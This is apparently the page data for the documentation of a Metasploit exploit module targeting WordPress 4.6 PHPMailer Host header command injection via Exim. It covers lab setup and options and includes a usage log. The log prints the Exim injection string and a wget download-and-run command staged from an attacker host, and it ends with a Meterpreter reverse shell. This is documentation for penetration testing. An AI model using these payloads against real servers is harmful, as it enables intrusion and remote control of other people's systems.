{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/wp_phpmailer_host_header","result":{"data":{"moduleMetadataJson":{"id":"93ae68db-8550-5dea-bc94-cc67b684a491","name":"WordPress PHPMailer Host Header Command Injection","fullname":"exploit/unix/webapp/wp_phpmailer_host_header","description":"This module exploits a command injection vulnerability in WordPress\n        version 4.6 with Exim as an MTA via a spoofed Host header to PHPMailer,\n        a mail-sending library that is bundled with WordPress.\n\n        A valid WordPress username is required to exploit the vulnerability.\n        Additionally, due to the altered Host header, exploitation is limited to\n        the default virtual host, assuming the header isn't mangled in transit.\n\n        If the target is running Apache 2.2.32 or 2.4.24 and later, the server\n        may have HttpProtocolOptions set to Strict, preventing a Host header\n        containing parens from passing through, making exploitation unlikely.","rank":200,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/wp_phpmailer_host_header","documentationSlug":"/modules/documentation/exploit/unix/webapp/wp_phpmailer_host_header"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This vuln has some caveats: you need approximately WordPress 4.6 with\nExim for the <code class=\"language-text\">sendmail(8)</code> command. You do not need to install\nPHPMailer, as it is included as part of the WordPress install.</p>\n<p>Thanks to WP's awesome practice of backporting the heck out of all their\npatches, we need to use a Git clone and check out the vuln release.</p>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<p>This was tested on Ubuntu 15.04. YMMV.</p>\n<ol>\n<li>got root?</li>\n<li><code class=\"language-text\">cd /var/www/html</code></li>\n<li><code class=\"language-text\">git clone https://github.com/WordPress/WordPress wordpress-4.6</code></li>\n<li><code class=\"language-text\">chown -R www-data:www-data wordpress-4.6</code></li>\n<li><code class=\"language-text\">cd wordpress-4.6</code></li>\n<li><code class=\"language-text\">git checkout 4.6</code></li>\n<li>Set up a MySQL database for WordPress</li>\n<li>Install as normal</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>VERBOSE</strong></p>\n<p>If you'd like to see what requests are being sent, set this to <code class=\"language-text\">true</code>.\nYou should see the Exim prestager commands being sent to the target.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/unix/webapp/wp_phpmailer_host_header \nmsf exploit(wp_phpmailer_host_header) &gt; set rhost 192.168.33.135\nrhost =&gt; 192.168.33.135\nmsf exploit(wp_phpmailer_host_header) &gt; set targeturi /wordpress-4.6\ntargeturi =&gt; /wordpress-4.6\nmsf exploit(wp_phpmailer_host_header) &gt; set lhost 192.168.33.1 \nlhost =&gt; 192.168.33.1\nmsf exploit(wp_phpmailer_host_header) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(wp_phpmailer_host_header) &gt; run\n\n[*] Started HTTPS reverse handler on https://192.168.33.1:8443\n[*] WordPress 4.6 installed at http://192.168.33.135/wordpress-4.6\n[*] Generating wget command stager\n[*] Using URL: http://0.0.0.0:8080/mbpvuuck\n[*] Local IP: http://[redacted]:8080/mbpvuuck\n[*] Generating and sending Exim prestager\n[*] Sending /bin/sh -c ${run{/bin/echo}{${extract{-1}{$value}{${readsocket{inet:192.168.33.1:8080}{get /mbpvuuck http/1.0$value$value}}}}}}\n[+] Sending wget${IFS}-qO${IFS}/tmp/vfotastd${IFS}http://192.168.33.1:8080/mbpvuuck;chmod${IFS}+x${IFS}/tmp/vfotastd;/tmp/vfotastd;rm${IFS}-f${IFS}/tmp/vfotastd\n[+] Sending payload linux/x64/meterpreter_reverse_https\n[*] https://192.168.33.1:8443 handling request from 192.168.33.135; (UUID: xyx88vod) Redirecting stageless connection from /nBwfbdUYNjU2TjBMb1VkagG08CfJO-jZYpOxBsWHQMGHh7p5ISjCG3Ze with UA &#39;Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko&#39;\n[*] https://192.168.33.1:8443 handling request from 192.168.33.135; (UUID: xyx88vod) Attaching orphaned/stageless session...\n[*] Meterpreter session 1 opened (192.168.33.1:8443 -&gt; 192.168.33.135:36075) at 2017-05-16 14:25:28 -0500\n[*] Sending /bin/rm -f /tmp/vfotastd\n[*] Server stopped.\n\nmeterpreter &gt;  </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"93ae68db-8550-5dea-bc94-cc67b684a491"}}}